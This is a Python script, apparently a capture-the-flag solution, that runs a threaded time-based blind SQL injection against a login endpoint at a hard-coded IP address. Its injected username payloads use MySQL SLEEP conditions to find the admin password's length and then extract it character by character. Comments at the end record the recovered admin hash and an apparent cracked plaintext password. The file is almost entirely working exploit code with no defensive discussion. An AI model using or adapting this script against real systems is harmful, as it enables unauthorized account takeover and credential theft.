import requests, string, threading
from queue import Queue

CHARSET = string.ascii_letters + string.digits

ip = '142.93.35.133:31762'
url = f'http://{ip}/api/login'

headers = {
    'Accept': '*/*',
    'Accept-Language': 'en,en-US;q=0.9,id;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'http://161.35.168.118:32506',
    'Referer': 'http://161.35.168.118:32506/',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
}

# user = query(f'SELECT username, password FROM users WHERE username = "{username}"', one=True)

def find_length_password():
    for i in range(20,40):
        json_data = {
            'username': f'admin" and if((select length(password) from users where username=\'admin\' limit 0,1)=\'{i}\', sleep(2), null) -- -',
            'password': 'test',
        }

        res = requests.post(url, headers=headers, json=json_data, verify=False)
        if res.elapsed.total_seconds() >1:
            print(i)
            break

# find_length_password()

password = [None] * 32

q = Queue()

def run(i):
    for char in CHARSET:
        json_data = {
            'username': f'admin" and if((select SUBSTRING(password,{i+1},1) from users where username=\'admin\' limit 0,1)=\'{char}\', sleep(3), null) -- -',
            'password': 'test',
        }

        res = requests.post(url, headers=headers, json=json_data, verify=False)

        if res.elapsed.total_seconds() >2:
            password[i] = char
            print(password)
            break

def threader():
	while True:
		val = q.get()
		run(val)
		q.task_done()

for i in range(32):
	q.put(i)
	
for _ in range(32):
	t = threading.Thread(target=threader)
	t.daemon = True
	t.start()

q.join()

print("".join(password))

# admin:1692b753c031f2905b89e7258dbc49bb
# ichliebedich